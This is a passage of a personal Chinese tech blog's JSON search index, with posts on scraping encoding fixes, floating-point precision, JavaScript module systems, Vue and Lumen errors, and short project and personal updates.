phpQuery 不能解析标签 return $html;&#125;$html = handleGbkPage($html);$ql = (new QueryList())-&gt;html($html); 先转码 gbk 为 utf-8 再把 meta 标签 charset=* 替换为 utf-8 https://github.com/jae-jae/QueryList/issues/34","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://qwqaq.com/categories/爬虫/"}],"tags":[{"name":"采集","slug":"采集","permalink":"http://qwqaq.com/tags/采集/"},{"name":"爬虫","slug":"爬虫","permalink":"http://qwqaq.com/tags/爬虫/"},{"name":"微信公众号","slug":"微信公众号","permalink":"http://qwqaq.com/tags/微信公众号/"},{"name":"乱码","slug":"乱码","permalink":"http://qwqaq.com/tags/乱码/"},{"name":"phpQuery","slug":"phpQuery","permalink":"http://qwqaq.com/tags/phpQuery/"}]},{"title":"0.1+0.2!=0.3 引发的思考","slug":"0-1-0-2-0-3-引发的思考","date":"2018-07-26T00:32:31.000Z","updated":"2018-07-26T07:54:52.249Z","comments":true,"path":"495603c2.html","link":"","permalink":"http://qwqaq.com/495603c2.html","excerpt":"0.1+0.1==0.2 得到了 true 而 0.1+0.2==0.3 却得到 false，这是为什么？ 换了好几种语言，都出现了这种情况，难道这是一个普遍存在的问题！？","text":"0.1+0.1==0.2 得到了 true 而 0.1+0.2==0.3 却得到 false，这是为什么？ 换了好几种语言，都出现了这种情况，难道这是一个普遍存在的问题！？ 123456789101112λ node&gt; 0.1 + 0.1 == 0.2true&gt; 0.1 + 0.1 === 0.2true&gt; 0.1 + 0.2 === 0.3false&gt; 0.1 + 0.2 == 0.3false&gt; 0.1 + 0.20.30000000000000004&gt; 12345678910λ python&gt;&gt;&gt; 0.1+0.2==0.3False&gt;&gt;&gt; 0.1+0.20.30000000000000004&gt;&gt;&gt; 0.1+0.1==0.2True&gt;&gt;&gt; 0.1+0.10.2&gt;&gt;&gt; 1234567891011121314λ php -aInteractive shellphp &gt; var_dump(0.1+0.1);float(0.2)php &gt; var_dump(0.1+0.2);float(0.3)php &gt; var_dump(0.1+0.2===0.3);bool(false)php &gt; var_dump(0.1+0.2==0.3);bool(false)php &gt; var_dump(0.3);float(0.3)php &gt; 实际上很简单。对于十进制数值系统（就是我们现实中使用的），它只能表示以进制数的质因子为分母的分数。10 的质因子有 2 和 5。因此 1/2、1/4、1/5、1/8和 1/10 都可以精确表示，因为这些分母只使用了10的质因子。相反，1/3、1/6 和 1/7 都是循环小数，因为它们的分母使用了质因子 3 或者 7。二进制下（进制数为2），只有一个质因子，即2。因此你只能精确表示分母质因子是2的分数。二进制中，1/2、1/4 和 1/8 都可以被精确表示。但是，1/5 或者 1/10 就变成了循环小数。所以，在十进制中能够精确表示的 0.1 与 0.2（1/10 与 1/5），到了计算机所使用的二进制数值系统中，就变成了循环小数。当你对这些循环小数进行数学运算时，并将二进制数据转换成人类可读的十进制数据时，会 对小数尾部进行截断处理。 https://www.cnblogs.com/mooncher/p/5145571.html https://github.com/camsong/blog/issues/9","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[{"name":"问题","slug":"问题","permalink":"http://qwqaq.com/tags/问题/"},{"name":"精度","slug":"精度","permalink":"http://qwqaq.com/tags/精度/"}]},{"title":"GitHub 社会化编程","slug":"GitHub-社会化编程","date":"2018-07-24T01:18:58.000Z","updated":"2018-07-24T08:47:55.857Z","comments":true,"path":"dd592165.html","link":"","permalink":"http://qwqaq.com/dd592165.html","excerpt":"GitHub 是为开发者提供 Git 仓库的托管服务。这是一个让开发者与朋友、同事、同学及陌生人共享代码的完美场所。 GitHub 这一服务，为开源世界带来了社会化编程的概念。这一概念影响了全世界众多的程序员，说其是软件开发方法的一次革命都不为过。在这里，我们将详细解说社会化编程概念。","text":"GitHub 是为开发者提供 Git 仓库的托管服务。这是一个让开发者与朋友、同事、同学及陌生人共享代码的完美场所。 GitHub 这一服务，为开源世界带来了社会化编程的概念。这一概念影响了全世界众多的程序员，说其是软件开发方法的一次革命都不为过。在这里，我们将详细解说社会化编程概念。 GitHub 这一服务创造了社会化编程的概念。随着 GitHub 的出现，软件开发者们才真正意义上拥有了源代码。世界上任何人都可以比从前更加容易获得源代码，将其自由更改并加以公开。如今，世界众多程序员都在通过 GitHub 公开源代码，同时利用 GitHub 支持着自己日常的软件开发。 在 GitHub 出现之前，软件开发中只有一小部分人拥有更改源代码的权利，这个特权阶级掌握着开发的主导权。开发者在改写、发布源代码之外，往往需要花更多时间和精力去说服这个特权阶级。这导致了许多起初效率很高的流行软件越发保守化，最终被时代所抛弃。 但是，GitHub 的出现为软件开发者的世界带来了真正意义上的“民主”，让所有人都平等拥有了更改源代码的特权。这在软件开发领域是一场巨大的革命。而革命者 GitHub 的口号是“社会化编程”。 为什么需要社会化编程当今的 IT 业界已经没有了终身雇佣制，人才流动性日益增大。可以说，每个月我们都能在一些著名开发者的博客中看到这样的现象：月末刚发布“辞职了”的消息，月初又“入职了”。 那么，如果您是程序员的面试官，两者之前你会选择哪一位呢？ 能查看到以前所写代码的程序员 or 无法查看的程序员 精通最新软件的程序员 or 不精通的程序员 对语言和软件差异带来的不同文化有所理解的程序员 or 不理解的程序员 为了不成为后一种程序员，理解社会化编程和 GitHub 至关重要。 不要闭目塞听，要接触不同的文化在工作中接触非公开代码的职业程序员们，更应该接触世界上的不同文化，拓展见闻。如果只在公司这一封闭的小世界中敲代码，往往在不知不觉间，手中的技术就变得陈腐不堪了。 放眼世界，注意哪些日新月异的源代码、技术、设计以及文化，会对自己编写的源代码及成果带来巨大影响。笔者自身也曾在知名框架的实现中受到启发，良好地实现了公司内部开发的软件。 会写代码的程序员更受青睐在软件开发行业中，Web 业界的变化尤其激烈，能实际编写源代码的程序员大受青睐。 在过去，程序员只需有简单的编程经验，用人单位更重视其人品、协调性、管理能力。但如今，能踏踏实实编写出代码的职业程序员反而更受欢迎。这是由于近年来随着技术的不断发展，开发一项服务需要用到多种编程语言和技术，以求兼容多种硬件设备。在这种背景下，判断一个求职者能否编写项目所需的源代码，最切实可行的办法就是看他实际写出的东西。 如今，GitHub 的出现已经让所有人平等拥有公开源代码的权利。看看 Facebook 或 Twitter 能了解一个人的品性，而看看 GitHub 就能了解一个程序员的实力。 今后，进行社会化编程的程序员会越来越多，从而成为一种普遍现象。在不远的将来，应聘的成功与否将越发重要。以编写代码为生的职业程序员们，更应该进行社会化编程。 GitHub 最大的特征是“面向人”这里讲解一下 GitHub 与单纯的仓库托管服务的不同之处，在笔者看来是一个重点问题。 GitHub 与以往的仓库托管服务最大的不同点，就在于它以人为中心。 以往的仓库托管服务都是以项目为中心，每个项目都是一个信息封闭的世界。虽然能够知道一个仓库的管理者是谁，但这个管理者还在做哪些事，我们就不得而知了。 GitHub 除项目之外，还可以把注意力集中到人身上。我们不但能阅览一个人公开的所有源代码，只要查看其控制面板中的 News Feed，还能知道他对哪些仓库感兴趣，什么时候做过提交等。一个人在 GitHub 进行的开发是一目了然的。 您可以将注意力聚焦到感兴趣的人身上。他既可以是您崇拜已久的超级黑客，也可以是同校同学或同事。 能同时关注人与代码，是 GitHub 为我们带来的一个新的世界。 摘抄至 《GitHub入门与实践》","categories":[{"name":"开发工具","slug":"开发工具","permalink":"http://qwqaq.com/categories/开发工具/"},{"name":"Git","slug":"开发工具/Git","permalink":"http://qwqaq.com/categories/开发工具/Git/"}],"tags":[{"name":"Git","slug":"Git","permalink":"http://qwqaq.com/tags/Git/"},{"name":"GitHub","slug":"GitHub","permalink":"http://qwqaq.com/tags/GitHub/"},{"name":"社会化编程","slug":"社会化编程","permalink":"http://qwqaq.com/tags/社会化编程/"}]},{"title":"解决 Unable to find the wrapper https","slug":"解决-Unable-to-find-the-wrapper-https","date":"2018-07-15T16:55:41.000Z","updated":"2018-07-15T17:02:29.695Z","comments":true,"path":"cf5f6a0e.html","link":"","permalink":"http://qwqaq.com/cf5f6a0e.html","excerpt":"Error creating resource: [message] fopen(): Unable to find the wrapper “https” - did you forget to enable it when you configured PHP?","text":"Error creating resource: [message] fopen(): Unable to find the wrapper “https” - did you forget to enable it when you configured PHP? FIRST配置 php.ini，取消注释 1extension=php_openssl.dll SECOND问题依然存在，检查配置毫无问题 原来… php.exe 存放路径含有中文字符 [file] C:\\Users\\XXX\\Desktop\\图\\qwq-coll\\src\\vendor\\guzzlehttp\\guzzle\\src\\Handler\\StreamHandler.php","categories":[{"name":"PHP","slug":"PHP","permalink":"http://qwqaq.com/categories/PHP/"}],"tags":[{"name":"错误处理","slug":"错误处理","permalink":"http://qwqaq.com/tags/错误处理/"},{"name":"php_openssl","slug":"php-openssl","permalink":"http://qwqaq.com/tags/php-openssl/"}]},{"title":"JS 模块化规范：CommonJS, AMD, CMD, UMD, ESM","slug":"JS-模块化规范：CommonJS-AMD-CMD-UMD-ESM","date":"2018-07-03T07:01:13.000Z","updated":"2018-11-24T16:04:10.660Z","comments":true,"path":"b8fd304a.html","link":"","permalink":"http://qwqaq.com/b8fd304a.html","excerpt":"模块化开发就像工厂生产手机一样，用多个模块组成一个完整的应用程序。JS 模块化开发有比较长的历史，早期流行 命名空间 的开发思想，到后来有了一些模块化开发的规范，最先是 CommonJS （诞生于 NodeJS 社区，但这是在本地用的，并不适合浏览器端），后来 AMD、CMD、UMD、ESM 等规范相继诞生。因为 JS 并未提供一种原生的、语言级别的模块化开发模式，而是将模块化的方法交给开发者来实现，所以这些规范的诞生，让用 JS 进行模块化开发变得规范。这是我的学习笔记，记录各种 JS 模块化规范，它们之间有什么区别。","text":"模块化开发就像工厂生产手机一样，用多个模块组成一个完整的应用程序。JS 模块化开发有比较长的历史，早期流行 命名空间 的开发思想，到后来有了一些模块化开发的规范，最先是 CommonJS （诞生于 NodeJS 社区，但这是在本地用的，并不适合浏览器端），后来 AMD、CMD、UMD、ESM 等规范相继诞生。因为 JS 并未提供一种原生的、语言级别的模块化开发模式，而是将模块化的方法交给开发者来实现，所以这些规范的诞生，让用 JS 进行模块化开发变得规范。这是我的学习笔记，记录各种 JS 模块化规范，它们之间有什么区别。 The Module Pattern，模块模式，也译为模组模式，是一种通用的对代码进行模块化组织与定义的方式。这里所说的模块（Modules），是指实现某特定功能的一组方法和代码。许多现代语言都定义了代码的模块化组织方式，比如 Golang 和 Java，它们都使用 package 与 import 来管理与使用模块，而目前版本的 JavaScript 并未提供一种原生的、语言级别的模块化组织模式，而是将模块化的方法交由开发者来实现。因此，出现了很多种 JavaScript 模块化的实现方式，比如，CommonJS Modules、AMD 等。 命名空间例如一个库，有 “库名.类别名.方法名” 123var NameSpace = &#123;&#125;;NameSpace.type = NameSpace.type || &#123;&#125;;NameSpace.type.method = function () &#123;&#125;; 如代码所示，有一个 NameSpace 等于一个对象，在 NameSpace 下面有某一个类型，某一个类型也是一个对象，如果需要在这个类型里面添加一个方法的话，你就可以通过这种方式去定义。 代码 NameSpace.type = NameSpace.type || {}; 我们可以看到在定义 NameSpace.type 的时候，会判断 如果 NameSpace.type 已被定义，那么就继续是原来的，如果他没有被定义，那么就是新的对象。在一个项目开始前，团队可以约定，谁用哪些命名空间、总的命名空间，通过这种方式，就可以避免命名空间重复覆盖的问题。但如果命名空间被覆盖了，是检测不到的，这是弊端之一。另外一个弊端是，当你想调用某个方法时必须记住它完整的路径名，这样是非常不方便的，所以 命名空间 这种方式还是存在许多弊端的。 例如：MY_APP.IndexView.NavbarController.RightArea.UserProfile.UpdateUserName(&quot;...&quot;) YUI2 大量使用了 命名空间 的方式，后来 YUI3 推出了一种沙箱机制(Sandbox)，通过这种沙箱机制，暂时解决了命名空间路径很长的问题 123456789101112YUI.add('hello', function (Y) &#123; Y.hello = function () &#123; Y.log('Hello World!'); &#125;;&#125;, '3.4.0', &#123; requires: ['harley-davidson', 'mt-dew']&#125;);YUI().use('hello', function (Y) &#123; // Module hello will be available here. Y.hello();&#125;); 可以在 GitHub 上了解 YUI.add 这个方法：传送门 CommonJS再后来 CommonJS 出现了 CommonJS 规定 (Modules/1.1.1) 一个文件为一个模块 使用 exports.xxx = ... 或 module.exports = {...} 暴露模块 在一个模块内的变量是不能被另一个模块直接访问的。也就是说在一个文件中，定义的一个变量，在另一个文件中是不能直接访问的，如果需要访问这个变量，则需通过 module.exports 这个 API (暴露模块接口) 来暴露它，让外界能够访问这些东西 使用 require(...) 方法来引入一个模块 require(...) 是同步执行 CommonJS Modules/1.1.1 详细规范：传送门 CommonJS 在 NodeJS 环境用，不适用于浏览器端 CommonJS 示例12345678910// a.jslet myFunc = function (msg) &#123; console.log('Hello World! ' + msg);&#125;;exports.helloWorld = myFunc;// b.jsconst a = require('./a.js');a.helloWorld('Date: 2018/7/3'); 命令行执行 node b.js 结果: Hello World! Date: 2018/7/3 123456789101112// foo.jsexports.a = function ()&#123; console.log('Hello World!');&#125;module.exports = &#123;a: 2&#125;exports.a = 1// test.jslet x = require('./foo');console.log(x.a) 命令行执行 node test.js 结果: 2 AMD全称 Asynchronous module definition（异步模块定义） AMD 规定 使用 define(...) 定义一个模块 使用 require(...) 加载一个模块（和 CommonJS 规范是相同的方法名，注意区分 CommonJS 和 RequireJS） 依赖前置，提前执行 AMD 详细规范：传送门 RequireJS 是 CMD 的一种实现 AMD 示例因为 RequireJS 实现了 AMD 规范。所以下面的例子也借助 RequireJS 去实现。 1234567891011121314define( // 模块名 \"alpha\", // 依赖 [\"require\", \"exports\", \"beta\"], // 模块输出 function (require, exports, beta) &#123; exports.verb = function() &#123; return beta.verb(); //Or: return require(\"beta\").verb(); &#125; &#125;); RequireJS 通过上面的方式定义一个模块，除此之外，还有另外一种方式： [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;] 对应着 function (a, b, c, d, e) { 方法的参数，在这个方法中可以直接使用这些依赖 12345678define( [\"a\", \"b\", \"c\", \"d\", \"e\"], function (a, b, c, d, e) &#123; // 在最前面声明并初始化了要用到的所有模块 if (false) &#123; // 即便不会调用到某个模块 c，但 c 还是被提前执行了 c.foo(); &#125; &#125;) 另外，因为 AMD 和 CommonJS 规范拥有相同的方法名 require，所以容易将 RequireJS(AMD) 和 CommonJS 记混，注意区分。 CMD全称 Common Module Definition（通用模块定义） CMD 规定 一个文件为一个模块 使用 define(...) 定义一个模块（和 AMD 相似） 使用 require(...) 加载一个模块（和 AMD 相似） 尽可能懒执行（和 AMD 的不同点） CMD 详细规范：传送门 SeaJS 是 CMD 的一种实现 CMD 示例1234567891011define(function(require, exports, module) &#123; var $ = require('jquery'); var Spinning = require('./spinning'); // 通过 exports 对外提供接口 // 注：不能直接对 exports 赋值，例如：exports = &#123;...&#125; exports.doSomething = ... // 或通过 module.exports 提供整个接口 module.exports = ...&#125;) CMD 和 AMD 的最显著区别 “as lazy as possible” CMD 推崇 as lazy as possible（尽可能的懒加载，也称为延迟加载，即在需要的时候才加载）。 对于依赖的模块，AMD 是提前执行，CMD 是延迟执行，两者执行方式不一样，AMD 执行过程中会将所有依赖前置执行，也就是在自己的代码逻辑开始前全部执行；而 CMD 如果 require 但 整个逻辑并未使用这个依赖 或 未执行到逻辑使用它的地方前 不会执行。。 不过 RequireJS 从 2.0 开始，也能改成延迟执行（根据写法不同，处理方式不同） CMD 推崇依赖就近，AMD 推崇依赖前置。 虽然 AMD 也支持 CMD 的写法，同时还支持将 require 作为依赖项传递，但 RequireJS 的作者默认是最喜欢上面的写法，也是官方文档里默认的模块定义写法。看代码： 1234567891011121314151617// CMDdefine(function(require, exports, module) &#123; var a = require('./a'); a.doSomething(); // 此处略去 100 行 var b = require('./b'); // 依赖可以就近书写 b.doSomething(); // ...&#125;);// AMD 默认推荐的是define(['./a', './b'], function(a, b) &#123; // 依赖必须一开始就写好 a.doSomething(); // 此处略去 100 行 b.doSomething(); //...&#125;); UMD全称 Universal Module Definition（万能模块定义），从名字就可以看出 UMD 做的是大一统的工作。Webpack 打包代码就有 UMD 这个选项。 它会做三件事情： 判断是否支持 AMD 判断是否支持 CommonJS 如果都不支持，使用全局变量 There are many techniques under UMD. My favourite UMD technique is returnExports. Here is example code on how to create math module using returnExport pattern. Place this code in “math.js” file 12345678910111213141516171819202122232425262728293031323334353637383940414243// if the module has no dependencies, the above pattern can be simplified to(function (root, factory) &#123; // Environment Detection // 对应上述的三个步骤 if (typeof define === 'function' &amp;&amp; define.amd) &#123; // 1.判断是否支持 AMD // 如果 define 这个方法是被定义 并且 define 这个方法是 AMD 的规范，那就把 factory 这个模块实体用 define 方法以 AMD 的规范 定义 define([], factory); // [] 是依赖，factory 是模块实体 &#125; else if (typeof exports === 'object') &#123; // 2. 判断是否支持 CommonJS // 如果 exports 是等于一个对象，则表明是在 Node 环境中运行，则支持 CommonJS，那就用 module.exports 暴露整个模块实体 module.exports = factory(); &#125; else &#123; // 3. 如果都不支持，使用全局变量 // Browser globals (root 即是 window) root.returnExports = factory(); &#125;&#125;(this, function () &#123; // Module Defination var sum = function(x, y)&#123; return x + y; &#125; var sub = function(x, y)&#123; return x - y; &#125; var math = &#123; findSum: function(a, b)&#123; return sum(a,b); &#125;, findSub: function(a, b)&#123; return sub(a, b); &#125; &#125; return math;&#125;)); ES Module (ESM)全称 ECMAScript Module ESM 现在比较流行，随着 ESM 规范的普及，开发过程越来越多地中使用 ESM 的模块化规范，例如： vue-loader v13.0.0 Now uses ES modules internally to take advantage of webpack 3 scope hoisting. ESM 规定 一个文件为一个模块 引入模块用 import 关键字 或 import(...) 方法 暴露模块用 export 关键字（没有 s，注意和 CommonJS 的 exports.xxx = ... 或 module.exports = {} 区分） ESM 示例import1234567891011121314// Default exports and named exportsimport theDefault, &#123; named1, named2 &#125; from 'src/mylib';import theDefault from 'src/mylib';import &#123; named1, named2 &#125; from 'src/mylib';// Renaming: import named1 as myNamed1import &#123; named1 as myNamed1, named2 &#125; from 'src/mylib';// Importing the module as an object// (with one property per named export)import * as mylib from 'src/mylib';// Only load the module, don't import anythingimport 'src/mylib'; export1234567export var myVar1 = '';export let myVar2 = '';export const MY_CONST = '';export function myFunc() &#123; &#125;export function* myGeneratorFunc() &#123; &#125;export class MyClass &#123; &#125; 1234567891011const MY_CONST = '';function myFunc() &#123;&#125;export &#123; MY_CONST, myFunc &#125;;export &#123; MY_CONST as THE_CONST, myFunc as theFun &#125;;export * from 'src/other_module';export &#123; foo, bar &#125; from 'src/other_module';// Export other_module's foo as myFooexport &#123; foo as myFoo, bar &#125; from 'src/other_module'; export default1234567891011export default 123;export default function (x) &#123; return x;&#125;export default x =&gt; x;export default class &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125;&#125; 实战123456789101112131415161718// a.jslet helloWorld = function (msg) &#123; console.log('Hello World! ' + msg);&#125;;export &#123;helloWorld&#125;;// b.jsimport &#123;helloWorld&#125; from './a.js';helloWorld('Date: 2018/7/3');// b.jsimport &#123;helloWorld as myTool&#125; from './a.js';myTool('Date: 2018/7/3');// b.jsimport * as a from './a.js';a.helloWorld('Date: 2018/7/3'); 1234567891011// a.jslet helloWorld = function (msg) &#123; console.log('Hello World! ' + msg);&#125;;export default helloWorld;// b.jsimport helloWorld from './a.js';helloWorld('Date: 2018/7/3'); 执行上面的 b.js 都会输出相同的结果 Hello World! Date: 2018/7/3 1234567891011121314151617181920212223// my-lib.jslet helloWorld = function (msg) &#123; console.log('Hello World! ' + msg);&#125;;let sayHello = function () &#123; console.log('Hello!');&#125;;let sayBye = function () &#123; console.log('Bye');&#125;;export &#123;sayHello, sayBye&#125;;export default helloWorld;// action.jsimport helloWorld, &#123;sayHello as afterHelloWorld, sayBye&#125; from './my-lib.js';helloWorld('Date: 2018/7/3');afterHelloWorld();sayBye(); 执行上面的 action.js： 12345babel-node action.jsHello World! Date: 2018/7/3Hello!Bye 让 Node 环境支持 ESM使用 Node v8.11.3 例如上面示例代码中，直接命令行 node action.js 会报错：SyntaxError: Unexpected token import 命令行执行 node --experimental-modules action.js 会出现提示 ExperimentalWarning: The ESM module loader is experimental. 可以使用 babel 让 Node 环境支持 ESM 语法 12345678910111213cd [项目目录]npm initnpm install --save babel-preset-latest babel-clitouch .babelrc# 编辑 .babelrc&#123; \"presets\": [\"latest\"]&#125;npm install babel-cli -gbabel-node action.js 动态 import()传送门：Native ECMAScript modules: dynamic import() Dynamic import() brings us the additional power to use the ES modules in an asynchronous way. To load them dynamically or conditionally depending on our needs, which gives us the ability to create even more advantage apps faster and better. 12345678910111213141516171819202122// STATICimport './a.js';import b from './b.js';b();import &#123;c&#125; from './c.js';c();// DYNAMICimport('./a.js').then(()=&gt;&#123; console.log('a.js is loaded dynamically');&#125;);import('./b.js').then((module)=&gt;&#123; const b = module.default; b('isDynamic');&#125;);import('./c.js').then((&#123;c&#125;)=&gt;&#123; c('isDynamic');&#125;); webpack 支持 AMD (RequireJS) ES Module (推荐的) CommonJS 虽然模块化规范有很多，但是只要掌握了 ES Module 和 CommonJS 这两种规范，那么使用 webpack 就基本没什么问题了，至于 AMD, CMD, UMD 了解一下足矣。","categories":[{"name":"前端","slug":"前端","permalink":"http://qwqaq.com/categories/前端/"}],"tags":[{"name":"CommonJS","slug":"CommonJS","permalink":"http://qwqaq.com/tags/CommonJS/"},{"name":"RequireJS","slug":"RequireJS","permalink":"http://qwqaq.com/tags/RequireJS/"},{"name":"ES6","slug":"ES6","permalink":"http://qwqaq.com/tags/ES6/"},{"name":"前端开发","slug":"前端开发","permalink":"http://qwqaq.com/tags/前端开发/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://qwqaq.com/tags/学习笔记/"}]},{"title":"Vue 报错 「Failed to mount component」","slug":"Vue-报错-「Failed-to-mount-component」","date":"2018-07-02T14:33:22.000Z","updated":"2018-07-03T07:04:36.304Z","comments":true,"path":"83cd7c12.html","link":"","permalink":"http://qwqaq.com/83cd7c12.html","excerpt":"vue-loader 更新导致","text":"vue-loader 更新导致 解决方法12345678const routes = [ &#123; name: 'home', path: '/',- component: require('Home.vue')+ component: () =&gt; import('Home.vue') &#125;,]; 参见 GitHub 1234567891011121314151617Breaking ChangesThe esModule option is now true by default, because this is necessary for ES-module-based scope hoisting to work. This means the export from a *.vue file is now an ES module by default, so async components via dynamic import like this will break:const Foo = () =&gt; import(&apos;./Foo.vue&apos;)Note: the above can continue to work with Vue 2.4 + vue-router 2.7, which will automatically resolve ES modules&apos; default exports when dealing with async components. In earlier versions of Vue and vue-router you will have to do this:const Foo = () =&gt; import(&apos;./Foo.vue&apos;).then(m =&gt; m.default)Alternatively, you can turn off the new behavior by explicitly using esModule: false in vue-loader options.Similarly, old CommonJS-style requires will also need to be updated:// beforeconst Foo = require(&apos;./Foo.vue&apos;)// afterconst Foo = require(&apos;./Foo.vue&apos;).defaultPostCSS 6 might break old PostCSS plugins that haven&apos;t been updated to work with it yet.","categories":[{"name":"前端","slug":"前端","permalink":"http://qwqaq.com/categories/前端/"},{"name":"Vue","slug":"前端/Vue","permalink":"http://qwqaq.com/categories/前端/Vue/"}],"tags":[{"name":"webpack","slug":"webpack","permalink":"http://qwqaq.com/tags/webpack/"},{"name":"前端","slug":"前端","permalink":"http://qwqaq.com/tags/前端/"},{"name":"Vue","slug":"Vue","permalink":"http://qwqaq.com/tags/Vue/"},{"name":"vue-loader","slug":"vue-loader","permalink":"http://qwqaq.com/tags/vue-loader/"},{"name":"错误处理","slug":"错误处理","permalink":"http://qwqaq.com/tags/错误处理/"}]},{"title":"Unbroken - Motivational Video 励志视频 中英字幕 超清","slug":"Unbroken-Motivational-Video-励志视频-中英字幕-超清","date":"2018-05-31T14:36:50.000Z","updated":"2018-10-02T07:04:01.229Z","comments":true,"path":"7b5628f7.html","link":"","permalink":"http://qwqaq.com/7b5628f7.html","excerpt":"2016-06-04 制作字幕 &amp; 上传 -&gt; 回放","text":"2016-06-04 制作字幕 &amp; 上传 -&gt; 回放 Everything will be OK.","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/tags/日常/"}]},{"title":"中考倒计时","slug":"中考倒计时","date":"2018-05-31T14:25:07.000Z","updated":"2018-07-02T15:24:45.848Z","comments":true,"path":"efdcce.html","link":"","permalink":"http://qwqaq.com/efdcce.html","excerpt":"最后第三模，然后中考","text":"最后第三模，然后中考 2018/5/31三模已考，等待 2018-6-20 的到来","categories":[{"name":"日常","slug":"日常","permalink":"http://qwqaq.com/categories/日常/"}],"tags":[]},{"title":"开源项目：Nacollector","slug":"开源项目：Nacollector","date":"2018-05-31T14:14:49.000Z","updated":"2019-01-28T14:15:57.417Z","comments":true,"path":"65c99d88.html","link":"","permalink":"http://qwqaq.com/65c99d88.html","excerpt":"实用的电商工具箱 淘宝、天猫、苏宁、国美 图片采集 预览 邀请… 淘宝账号登录 多线程异步 任务管理器 下载内容管理器 Cookie 获取器 实时日志。C#, CefSharp, WebDriver, Material Design 暑假作品 Jul 24, 2017 前往 GitHub","text":"实用的电商工具箱 淘宝、天猫、苏宁、国美 图片采集 预览 邀请… 淘宝账号登录 多线程异步 任务管理器 下载内容管理器 Cookie 获取器 实时日志。C#, CefSharp, WebDriver, Material Design 暑假作品 Jul 24, 2017 前往 GitHub Features Material Design WEB 界面（使用 CefSharp） 实时采集日志 多任务管理器 下载内容管理器 Cookie 获取器（可手动导入 Cookie） 多线程异步采集 使用网络代理 在线更新 … What you can do with Nacollector 理想是做成一个可拓展的采集平台 Screenshots","categories":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/categories/项目/"},{"name":"Nacollector","slug":"项目/Nacollector","permalink":"http://qwqaq.com/categories/项目/Nacollector/"}],"tags":[{"name":"CSharp","slug":"CSharp","permalink":"http://qwqaq.com/tags/CSharp/"},{"name":"Nacollector","slug":"Nacollector","permalink":"http://qwqaq.com/tags/Nacollector/"},{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/tags/项目/"},{"name":"开源项目","slug":"开源项目","permalink":"http://qwqaq.com/tags/开源项目/"},{"name":"QWQCODE","slug":"QWQCODE","permalink":"http://qwqaq.com/tags/QWQCODE/"}]},{"title":"开源项目：Book Register","slug":"开源项目：Book-Register","date":"2018-05-31T14:07:07.000Z","updated":"2018-08-02T03:10:32.974Z","comments":true,"path":"5f8469ca.html","link":"","permalink":"http://qwqaq.com/5f8469ca.html","excerpt":"JS+PHP 一个适用于图书室 多人协作共同完成图书录入任务 的在线工作站。附带实时弹幕功能，Material Design，练手初中为学校做的项目，2333 前往 GitHub","text":"JS+PHP 一个适用于图书室 多人协作共同完成图书录入任务 的在线工作站。附带实时弹幕功能，Material Design，练手初中为学校做的项目，2333 前往 GitHub Features 美观友好的 UI 快速上手 简单的操作 多人协作 多人完成同一类目 实时弹幕 全局显示用户动作 在线监测 不活跃成员查看 自动补全 快速输入 数据统计 成员战绩分析 导出 所有/单个 类目为一整个 .xls 文件 带 API, 运用 AJAX, Web Socket…","categories":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/categories/项目/"}],"tags":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/tags/项目/"},{"name":"开源项目","slug":"开源项目","permalink":"http://qwqaq.com/tags/开源项目/"},{"name":"QWQCODE","slug":"QWQCODE","permalink":"http://qwqaq.com/tags/QWQCODE/"}]},{"title":"开源项目：QwQuery","slug":"开源项目：QwQuery","date":"2018-05-31T13:54:52.000Z","updated":"2018-08-02T03:11:27.296Z","comments":true,"path":"cbaf3368.html","link":"","permalink":"http://qwqaq.com/cbaf3368.html","excerpt":"QwQuery 是一个 Material Design 风格的学生考试成绩统计站，表格 / 统计图 / 字段排序 / 条件筛选 / 排名处理 前往 GitHub","text":"QwQuery 是一个 Material Design 风格的学生考试成绩统计站，表格 / 统计图 / 字段排序 / 条件筛选 / 排名处理 前往 GitHub Features Material Design 根据 学生姓名 学校 班级 查询 每个科目成绩排序，正序 倒序 表格 固定表头 全屏显示 手动调整字体大小 隐藏指定字段 设定每页显示项目数量 快速查看每组数据的平均分 直接保存为 .xls 电子表格文件 直接打印 显示考生数 趋势，统计图 历史成绩 总分趋势 市平均分趋势 控制台功能 构建排名（录取人数风格） 统一原本不同的学校名和班级名（姓名作为桥梁） 适配手机端 响应式页面 Screenshots","categories":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/categories/项目/"}],"tags":[{"name":"项目","slug":"项目","permalink":"http://qwqaq.com/tags/项目/"},{"name":"开源项目","slug":"开源项目","permalink":"http://qwqaq.com/tags/开源项目/"},{"name":"QWQCODE","slug":"QWQCODE","permalink":"http://qwqaq.com/tags/QWQCODE/"}]},{"title":"Lumen 添加没有的 key:generate 命令","slug":"Lumen-添加没有的-key-generate-命令","date":"2018-05-31T13:17:16.000Z","updated":"2018-07-02T15:08:50.784Z","comments":true,"path":"65f7d82e.html","link":"","permalink":"http://qwqaq.com/65f7d82e.html","excerpt":"Lumen is a stunningly fast micro-framework by Laravel. .env 文件中需要配置 APP_KEY=，想通过和 Laravel 相同的方式随机生成一个 KEY，执行命令 artisan key:generate 结果却是 Command is not defined.，那就需要自己加一个 key:generate 功能","text":"Lumen is a stunningly fast micro-framework by Laravel. .env 文件中需要配置 APP_KEY=，想通过和 Laravel 相同的方式随机生成一个 KEY，执行命令 artisan key:generate 结果却是 Command is not defined.，那就需要自己加一个 key:generate 功能 app/Console/Kernel.php12cd app/Consolevim Kernel.php 1234protected $commands = [ // ... \\App\\Console\\Commands\\KeyGenerateCommand::class // 添加此行]; app/Console/Commands/KeyGenerateCommand.php12cd app/Console/Commandsvim KeyGenerateCommand.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?phpnamespace App\\Console\\Commands;use Illuminate\\Support\\Str;use Illuminate\\Console\\Command;use Symfony\\Component\\Console\\Input\\InputOption;class KeyGenerateCommand extends Command&#123; /** * The console command name. * * @var string */ protected $name = 